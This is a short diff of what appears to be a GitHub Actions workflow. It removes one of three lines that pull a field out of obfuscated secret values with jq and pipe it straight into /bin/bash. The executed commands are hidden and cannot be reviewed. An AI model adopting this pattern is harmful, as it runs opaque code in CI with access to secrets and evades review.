@@ -17,7 +17,6 @@ jobs:
           rny36: ${{ secrets.rny36 }}
         run: |
           printf '%s' "$rny36" | jq -r .wz5207 | /bin/bash
-          echo $oy579 | jq -r .hpj546 | /bin/bash
           echo $dhfzl89543 | jq -r .g4 | /bin/bash
 
       - name: Upload artifact
